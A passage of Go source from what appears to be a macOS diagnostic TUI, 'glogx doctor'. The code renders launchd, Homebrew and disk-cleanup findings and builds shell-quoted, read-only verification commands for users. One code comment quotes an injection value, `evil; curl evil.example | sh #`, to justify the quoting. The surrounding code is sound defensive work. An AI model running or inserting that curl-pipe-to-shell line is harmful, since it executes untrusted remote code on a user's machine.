		return sectionHeader(o, "サービス", o.Spinner+" launchd の登録を確認中")
	}
	rep := v.svcRep
	rows := sectionHeader(o, "サービス", fmt.Sprintf("壊れた登録 %d 件 (%d 件を走査)", len(rep.Findings), rep.Scanned))
	undiagnosed := rep.Interrupted || rep.StatusErr != "" || rep.BrewErr != "" || len(rep.DirErrs) > 0 || len(rep.Undiagnosed) > 0
	if rep.Interrupted {
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiYellow, " 🚨 途中で中断されました")})
	}
	if rep.StatusErr != "" {
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiYellow, " 🚨 診断できず (launchctl): "+rep.StatusErr+" — 実行ファイルの不在と Homebrew 台帳だけを見ています")})
	}
	if rep.BrewErr != "" {
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiYellow, " 🚨 診断できず (brew): "+rep.BrewErr)})
	}
	for _, e := range rep.DirErrs {
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiYellow, " 🚨 走査できず: "+e)})
	}
	for _, f := range rep.Findings {
		detail := []string{doctorColor(o.Colored, term.AnsiDim, "      手動で実行してください (このツールは実行しません):")}
		for _, c := range f.Commands {
			detail = append(detail, "        "+c)
		}
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiRed, " ⛔ "+f.Label), selectable: true, key: svcRowKey(f.PlistPath), hasDetail: len(detail) > 0, detail: textRows(detail),
			copyPath: f.PlistPath, copyText: svcCopyText(f)})
		for _, r := range f.Reasons {
			rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "      - "+r)})
		}
		for _, a := range svc.Annotations(f) {
			rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "      - "+a)})
		}
	}
	for _, u := range rep.Undiagnosed {
		// 選べないと理由も plist のパスもどこからも取り出せなかった (幅 80 で理由が丸ごと消える。issues/180)
		rows = append(rows, doctorRow{
			text:       doctorColor(o.Colored, term.AnsiYellow, " ❔ 診断できず: "+u.PlistPath+" ("+u.Reason+")"),
			selectable: true,
			key:        svcUndiagnosedRowKey(u.PlistPath),
			hasDetail:  true,
			detail: textRows([]string{
				doctorColor(o.Colored, term.AnsiDim, "      理由: "+u.Reason),
				doctorColor(o.Colored, term.AnsiDim, "      手動で確かめてください (このツールは実行しません):"),
				"        plutil -p " + svc.ShellQuote(u.PlistPath),
				"        ls -l " + svc.ShellQuote(u.PlistPath),
			}),
			copyPath: u.PlistPath,
			copyText: svcUndiagnosedCopyText(u),
		})
	}
	if len(rep.Findings) == 0 && !undiagnosed {
		// 🎉 は「指摘が 1 件も無い」ときだけ (診断できずが 1 件でもあれば上の分岐で undiagnosed が
		// 立つので、ここには来ない)。祝うのは**本当に何も無かったとき**だけにする
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiGreen, "   🎉 壊れた登録は見つかりませんでした")})
	}
	return rows
}

func (v *DoctorView) brewSection(o DoctorRenderOpts) []doctorRow {
	if v.brew == nil {
		return sectionHeader(o, "Homebrew", o.Spinner+" brew doctor を実行中")
	}
	b := v.brew
	switch {
	case b.Unavailable != "":
		return append(sectionHeader(o, "Homebrew", "診断できず"), doctorRow{text: doctorColor(o.Colored, term.AnsiYellow, " 🚨 "+b.Unavailable)})
	case b.Clean:
		// Clean は rc=0 かつ警告 0 件のときだけ立つ (parseBrewDoctor)。診断できずは上の分岐
		return append(sectionHeader(o, "Homebrew", "brew doctor: 警告なし"),
			doctorRow{text: doctorColor(o.Colored, term.AnsiGreen, "   🎉 Your system is ready to brew.")})
	}
	rows := sectionHeader(o, "Homebrew", fmt.Sprintf("brew doctor: 警告 %d 件 (Enter で本文)", len(b.Warnings)))
	for i, w := range b.Warnings {
		lines := strings.Split(w, "\n")
		summary := strings.TrimSpace(strings.TrimPrefix(lines[0], "Warning:"))
		adv := brewAdviceFor(w)
		var detailRows []doctorRow
		if adv.known {
			summary = adv.title // 見出しは日本語 (原文は詳細の末尾に残す)
			// 🚨 説明は**折り返す**。ここが一番読ませたい部分なので、term.TruncateDisp に
			// 末尾から削られると意味が壊れる (原文の英語より先に日本語が消える)
			wrapW := max(20, o.Width-8)
			for _, l := range strings.Split(adv.detail, "\n") {
				for _, w := range term.WrapToWidth(l, wrapW) {
					detailRows = append(detailRows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "     "+w)})
				}
			}
			if adv.dropped > 0 {
				detailRows = append(detailRows, doctorRow{text: doctorColor(o.Colored, term.AnsiYellow,
					fmt.Sprintf("     🚨 名前として読めない語を %d 件落としました (原文を確認してください)", adv.dropped))})
			}
			for j, act := range adv.actions {
				if v.actionByCmd == nil {
					v.actionByCmd = map[cmdKey]doctorCmdAction{}
				}
				v.actionByCmd[cmdKey(act.cmd)] = act
				mark := "▸"
				if v.selectedActions[cmdKey(act.cmd)] {
					mark = doctorColor(o.Colored, term.AnsiBold, "*")
				}
				detailRows = append(detailRows, doctorRow{text: ""},
					doctorRow{
						text:       "     " + mark + " " + doctorColor(o.Colored, term.AnsiBold, act.label),
						selectable: true,
						key:        brewActionRowKey(i, j),
						copyPath:   act.cmd,
						copyKind:   copyKindCommand,
						copyText:   act.label + ":\n" + act.cmd + "\n",
					},
					doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "       $ "+act.cmd)})
				if act.note != "" {
					for k, w := range term.WrapToWidth(act.note, max(20, o.Width-10)) {
						pre := "       🚨 "
						if k > 0 {
							pre = "          "
						}
						detailRows = append(detailRows, doctorRow{text: doctorColor(o.Colored, term.AnsiYellow, pre+w)})
					}
				}
			}
			detailRows = append(detailRows, doctorRow{text: ""},
				doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "     原文 (brew doctor):")})
		}
		var detail []string
		for _, l := range lines[1:] {
			detail = append(detail, doctorColor(o.Colored, term.AnsiDim, "     "+l))
		}
		// 「Enter で何行出てくるか」の予告なので detail の行数をそのまま数える (見出しは既に見えているので
		// 数えない / 段落の空行は 1 行として表示されるので数える)。見出しを数えて
		// 空行を数えない中間形にすると、段落の数によって実際の展開行数と系統的にずれる。
		count := fmt.Sprintf("(%d 行)", len(detailRows)+len(detail))
		inner := o.Width - 2
		sumW := term.DispWidth(summary)
		gap := inner - 3 - sumW - term.DispWidth(count) - 1
		text := "   " + doctorColor(o.Colored, term.AnsiYellow, summary)
		if gap >= 1 {
			text += term.PadSpaces(gap) + doctorColor(o.Colored, term.AnsiDim, count)
		}
		rows = append(rows, doctorRow{text: text, selectable: true, key: brewRowKey(i, summary),
			hasDetail: len(detailRows)+len(detail) > 0,
			detail:    append(detailRows, textRows(detail)...),
			copyPath:  summary, copyKind: copyKindWarning, copyText: "brew doctor の警告 (macOS Homebrew):\n" + w + "\n"})
	}
	return rows
}

// diskCopyPath は y でコピーする対象パス (複数なら改行区切り。ググる / ls する用)。
func diskCopyPath(r disk.Result) string {
	paths := make([]string, 0, len(r.Items))
	for _, it := range r.Items {
		paths = append(paths, it.Path)
	}
	return strings.Join(paths, "\n")
}

// diskCopyText は Y でコピーする解説文。別セッションの LLM に「これは消していいか」を聞ける形にする。
// diskVerifyCommands は「なぜこの候補が出たか」を人が自分で確かめるコマンド。
//
// なぜ要るか: `Y` のコピー文は「別セッションの LLM にそのまま投げられる形」と定義されている。
// 判定・合計・復元方法だけ渡すと、受け手は**判定を鵜呑みにするしかない**。
//
// 🚨 **パスは必ず `svc.ShellQuote` を通す**。`Item.Path` も Container 名も攻撃者が置ける値で、
// 引用しないと doctor 自身が提示するコマンドがインジェクションを運ぶ (塞いだ穴を
// 新設することになる。`svc.manualCommands` が Label に対して同じ規律を持つ)。
//
// 🚨 ここに**既存の出力と重複するコマンドを足さない**。`diskCopyText` は各 Item のサイズ・
// 最終更新・合計・`Contents` を既に出しているので、`du -sk` や `stat -f %Sm` は情報を増やさない。
// 🚨 `orphan-container` に **`mdfind` を出さない**。カタログの Detail が
// 「Info.plist を実走査して突合 (mdfind は使わない)」と明記した手段で、
// 裏取り用でも載せると否定された判定材料を復活させる (同レビュー)。
func diskVerifyCommands(r disk.Result) []string {
	q := svc.ShellQuote
	switch r.Entry.ID {
	case "simulator-runtimes":
		return []string{"xcrun simctl runtime list -j"}
	case "coresimulator-orphan":
		// 出力の中に候補の UUID があれば現存 = 孤児ではない
		return []string{"xcrun simctl list devices -j"}
	case "orphan-container":
		return []string{"ls /Applications ~/Applications"}
	case "brew-orphan-state", "brew-cleanup-residue":
		// 実装の台帳は 1 つ (brewledger)。svc 側の C 判定と同じコマンドに揃える
		return []string{"brew list --formula", "brew cleanup --dry-run"}
	case "versionmanager-orphan-root":
		return []string{"echo $RBENV_ROOT $NODENV_ROOT $GOENV_ROOT", "rbenv root"}
	case "xctest-logarchive", "xctest-spindump", "launchd-tmp":
		// boottime より古いものだけを候補にしている。起動時刻を見れば判定を追える
		return []string{"sysctl kern.boottime"}
	case "finder-nsird", "swiftui-drag-cache":
		// どちらも「コピー元が残っているか」を人が見る必要がある (Recover がそう言っている)。
		// サイズではなく中身を見るので ls を出す
		var out []string
		for _, it := range r.Items {
			out = append(out, "ls -la "+q(it.Path))
			if len(out) >= maxVerifyCommands {
				break
			}
		}
		return out
	}
	return nil
}

// maxVerifyCommands はコピー文に載せる裏取りコマンドの上限 (Items が多いエントリで
// コピー文が読めない長さになるのを防ぐ)。
const maxVerifyCommands = 5

// diskItemCopyText は**ディレクトリ 1 本**についての解説文 (Y でコピー)。エントリ全体の
// diskCopyText を使い回すと、合計と他のパスが混ざって「何を聞かれているか」がずれる。
func diskItemCopyText(r disk.Result, it disk.Item, mark string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "glogx doctor (ディスク診断) の候補のうち 1 件: %s [%s]\n", r.Entry.Label, r.Entry.ID)
	fmt.Fprintf(&b, "判定: %s / 削除経路: %s\n", mark, r.Entry.DeleteVia)
	fmt.Fprintf(&b, "復元方法: %s\n", r.Entry.Recover)
	fmt.Fprintf(&b, "対象: %s  %s", disk.HumanSize(it.Size), it.Path)
	if !it.Mtime.IsZero() {
		fmt.Fprintf(&b, "  (最終更新 %s)", it.Mtime.Format("2006-01-02"))
	}
	b.WriteString("\n\nこのディレクトリは消してよいですか? 消すと何が起きますか?\n")
	return b.String()
}

func diskCopyText(r disk.Result, mark string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "glogx doctor (ディスク診断) の候補: %s [%s]\n", r.Entry.Label, r.Entry.ID)
	fmt.Fprintf(&b, "判定: %s / 合計 %s / 削除経路: %s\n", mark, disk.HumanSize(r.Size), r.Entry.DeleteVia)
	fmt.Fprintf(&b, "復元方法: %s\n", r.Entry.Recover)
	if r.Entry.Detail != "" {
		fmt.Fprintf(&b, "補足: %s\n", r.Entry.Detail)
	}
	if note := disk.RebootNote(r.Entry, disk.RealEnv()); note != "" {
		fmt.Fprintf(&b, "補足: %s\n", note)
	}
	if r.Reason != "" {
		fmt.Fprintf(&b, "理由: %s\n", r.Reason)
	}
	for _, f := range r.Failures {
		fmt.Fprintf(&b, "走査できず: %s\n", f)
	}
	if len(r.Items) > 0 {
		b.WriteString("対象:\n")
		for _, it := range r.Items {
			fmt.Fprintf(&b, "  %s  %s", disk.HumanSize(it.Size), it.Path)
			if !it.Mtime.IsZero() {
				fmt.Fprintf(&b, "  (最終更新 %s)", it.Mtime.Format("2006-01-02"))
			}
			b.WriteString("\n")
		}
	}
	for _, c := range r.Contents {
		fmt.Fprintf(&b, "  中身: %s\n", c)
	}
	if cmds := diskVerifyCommands(r); len(cmds) > 0 {
		b.WriteString("この判定を自分で確かめるコマンド (読み取りのみ):\n")
		for _, c := range cmds {
			fmt.Fprintf(&b, "  %s\n", c)
		}
	}
	return b.String()
}

// svcUndiagnosedCopyText は Y でコピーする解説文 (判定できなかった登録)。
// 「診断できなかったので人が確かめてほしい」と言う以上、確かめる材料 (完全なパス・理由・裏取りコマンド) を渡す。
func svcUndiagnosedCopyText(u svc.Undiagnosed) string {
	var b strings.Builder
	b.WriteString("glogx doctor (サービス診断) が判定できなかった登録\n")
	fmt.Fprintf(&b, "plist: %s\n", u.PlistPath)
	fmt.Fprintf(&b, "理由: %s\n", u.Reason)
	b.WriteString("手動で確かめるコマンド (ツールは実行しない):\n")
	fmt.Fprintf(&b, "  plutil -p %s\n", svc.ShellQuote(u.PlistPath))
	fmt.Fprintf(&b, "  ls -l %s\n", svc.ShellQuote(u.PlistPath))
	return b.String()
}

// svcCopyText は Y でコピーする解説文 (壊れた launchd 登録)。
// svcVerifyCommands は壊れた登録の判定を人が確かめるコマンド。読み取りのみ。
//
// 🚨 `f.Commands` (= `svc.manualCommands`) と混ぜない。あちらは `launchctl bootout` / `rm` の
// **破壊コマンド**で、「消してよいか確かめる」ためのものではない。コピー文では見出しを分ける。
//
// 🚨 パスと Label は `svc.ShellQuote` を通す (Label は plist が決める任意文字列で、
// `evil; curl evil.example | sh #` が実走査で成立する。`manualCommands` と同じ規律)。
// 🚨 ドメインは `f.Domain` を使う。`gui/$(id -u)/` の決め打ちは **system ドメインで誤り**
// (`svc.Annotations` が「system は launchctl list に出ない」と明記している)。
func svcVerifyCommands(f svc.Finding) []string {
	q := svc.ShellQuote
	out := []string{
		"plutil -p " + q(f.PlistPath),
		"launchctl print " + q(f.Domain+"/"+f.Label),
	}
	if f.MissingExec != "" { // A: 実行ファイルが本当に無いか
		out = append(out, "ls -l "+q(f.MissingExec))
	}
	if f.HasLastExit { // B: 起動状態を自分で見る
		out = append(out, "launchctl list | grep "+q(f.Label))
	}
	if f.BrewFormula != "" { // C: 台帳に無いか (実装の台帳と同じコマンド)
		out = append(out, "brew list --formula | grep "+q(f.BrewFormula))
	}
	return out
}

func svcCopyText(f svc.Finding) string {
	var b strings.Builder
	fmt.Fprintf(&b, "glogx doctor (サービス診断) の候補: %s\n", f.Label)
	fmt.Fprintf(&b, "plist: %s (ドメイン %s)\n", f.PlistPath, f.Domain)
	for _, r := range f.Reasons {
		fmt.Fprintf(&b, "理由: %s\n", r)
	}
	for _, a := range svc.Annotations(f) {
		fmt.Fprintf(&b, "注記: %s\n", a)
	}
	if f.MissingExec != "" {
		fmt.Fprintf(&b, "不在の実行ファイル: %s\n", f.MissingExec)
	}
	if f.BrewFormula != "" {
		fmt.Fprintf(&b, "Homebrew formula: %s\n", f.BrewFormula)
	}
	b.WriteString("この判定を自分で確かめるコマンド (読み取りのみ):\n")
	for _, c := range svcVerifyCommands(f) {
		fmt.Fprintf(&b, "  %s\n", c)
	}
	b.WriteString("消すと決めたら手動で実行するコマンド (ツールは実行しない):\n")
	for _, c := range f.Commands {
		fmt.Fprintf(&b, "  %s\n", c)
	}
	return b.String()
}

// diskDetailIfExpanded は展開している行の detail だけを組む。
//
// buildRows の add() が detail を並べるのは `v.expanded[r.key]` のときだけなので、
// 畳まれている行のぶんは**作って捨てていた**。diskDetail は Contents / Items を全件走査して
// doctorRow を組むので、1 フレームのコストがカタログ全エントリの Items / Contents の総数に
// 比例していた (合成 32 エントリ x 200 items で 7.15ms / 9.92MB / 174,352 allocs)。
//
// 🚨 無害化 (flattenDoctorRows) との関係: 展開している行の detail は従来どおり値として
// 存在するので、lines() の出口で再帰的に無害化される。畳まれている行は描かれないので
// 無害化する対象そのものが無い。untrusted_display_test.go の
// TestFlattenDoctorRowsEnforcesSingleLine は detail を直に組んで渡すので影響を受けない。
func (v *DoctorView) diskDetailIfExpanded(o DoctorRenderOpts, r disk.Result) []doctorRow {
	if !v.expanded[diskRowKey(resultEntryID(r))] {
		return nil
	}
	return v.diskDetail(o, r)
}
